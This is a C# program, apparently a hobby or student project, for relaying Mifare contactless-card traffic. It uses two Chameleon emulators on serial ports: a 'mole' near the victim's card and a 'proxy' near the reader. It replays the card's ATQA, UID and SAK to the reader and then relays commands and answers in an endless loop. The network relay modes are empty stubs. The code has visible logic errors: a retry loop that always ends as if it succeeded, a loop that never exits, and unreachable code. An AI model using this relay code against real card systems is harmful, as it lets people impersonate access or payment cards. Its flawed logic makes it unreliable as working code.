using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;
using System.IO;
using MifareModules;

namespace ChameleonProxy
{
    class Program
    {
        static void Main(string[] args)
        {
            // nastavit parametry
            ProgramArguments pArgs = new ProgramArguments(args);
            int waitTime = pArgs.MoleWaitTime;
            int proxyWaitTime = pArgs.ProxyWaitTime;

            if (pArgs.SimpleAttack)
            {
                SimpleProxyAttack(waitTime, proxyWaitTime, pArgs.MoleComName, pArgs.ProxyComName);
            }

            else if (pArgs.Proxy)
            {
                NetworkAttackProxy(pArgs);
            }
            else if (pArgs.Mole)
            {
                NetworkAttackMole(pArgs);
            }

        }

        private static void NetworkAttackProxy(ProgramArguments pArgs)
        {

        }

        private static void NetworkAttackMole(ProgramArguments pArgs)
        {

        }

        private static void SimpleProxyAttack(int moleWaitTime, int proxyWaitTime, string molePort = "COM3", string proxyPort = "COM4")
        {
            // initialize chameleons
            SerialModuleConfig chameleon1Config = new SerialModuleConfig()
            {
                PortName = molePort,

            };
            SerialModule serial1 = new SerialModule(chameleon1Config)
            {
                Verbose = false,
            };

            ChameleonModule mole = new ChameleonModule(serial1)
            {
                Verbose = true,
            };
            CardModule cardMole = new CardModule(mole) { Verbose = true };

            SerialModuleConfig chameleon2config = new SerialModuleConfig()
            {
                PortName = proxyPort,
            };
            SerialModule serial2 = new SerialModule(chameleon2config)
            {
                Verbose = false,
            };
            ChameleonModule proxy = new ChameleonModule(serial2)
            {
                Verbose = true,
            };

            bool anticolisionPassed = false;
            string Atqa = "";
            string uid = "";
            string sak = "";
            string answer = "";

            while (!anticolisionPassed)
            {
                try
                {
                    // anticolise mole to card
                    Atqa = cardMole.ReqA();
                    Sleep(moleWaitTime);
                    uid = cardMole.Select();
                    Sleep(moleWaitTime);
                    sak = cardMole.SelectUid(uid);
                }
                catch (NoDataException)
                {
                    anticolisionPassed = false;
                }
                anticolisionPassed = true;
            }
            anticolisionPassed = false;
            while (!anticolisionPassed)
            {
                //anticolise proxy to reader
                //hope this will work
                //assuming reqA has been sent
                proxy.Send(Atqa);
                Sleep(proxyWaitTime);
                proxy.Send(uid);
                Sleep(proxyWaitTime);
                answer = proxy.SendWithAnswer(sak);
                Sleep(proxyWaitTime);
            }
            while (true)
            {
                //actual proxying
                answer = mole.SendWithAnswer(answer);
                answer = proxy.SendWithAnswer(answer);
                Sleep(proxyWaitTime);

            }

            Console.ReadLine();

        }

        private static void Sleep(int ms)
        {
            if (ms > 0)
            {
                Thread.Sleep(ms);
            }
        }
    }

    class ProgramArguments
    {
        public bool SimpleAttack = true;
        public bool Mole = false;
        public bool Proxy = false;
        public string MoleIp = "";
        public string MolePort = "";
        public string MoleComName = "COM3";
        public string ProxyComName = "COM4";
        public int MoleWaitTime = 2;
        public int ProxyWaitTime = 0;

        public ProgramArguments(string[] args)
        {
            if (args.Contains("-s"))
            {
                SimpleAttack = true;
                Mole = false;
                Proxy = false;

                if (args.Contains("--mcom"))
                {
                    MoleComName = args[Array.IndexOf(args, "--mcom") + 1];
                }
                if (args.Contains("--pcom"))
                {
                    ProxyComName = args[Array.IndexOf(args, "--pcom") + 1];
                }
            }
            if (args.Contains("-m"))
            {
                SimpleAttack = false;
                Mole = true;
                Proxy = false;

                if (args.Contains("--mport"))
                {
                    MolePort = args[Array.IndexOf(args, "--mport") + 1];
                }
                if (args.Contains("--mcom"))
                {
                    MoleComName = args[Array.IndexOf(args, "--mcom") + 1];
                }
            }

            if (args.Contains("-p"))
            {
                SimpleAttack = false;
                Mole = false;
                Proxy = true;

                if (args.Contains("--mport"))
                {
                    MolePort = args[Array.IndexOf(args, "--mport") + 1];
                }

                if (args.Contains("--mip"))
                {
                    MoleIp = args[Array.IndexOf(args, "--mip") + 1];
                }
                if (args.Contains("--pport"))
                {
                    ProxyComName = args[Array.IndexOf(args, "--pport") + 1];
                }
            }

            if (args.Contains("-w"))
            {
                MoleWaitTime = int.Parse(args[Array.IndexOf(args, "-w") + 1]);
            }
            if (args.Contains("-r"))
            {
                ProxyWaitTime = int.Parse(args[Array.IndexOf(args, "-r") + 1]);
            }

            if (args.Contains("-h") || args.Contains("--help"))
            {
                Console.WriteLine("this is help ...");
                Environment.Exit(0);
            }
        }
    }
}
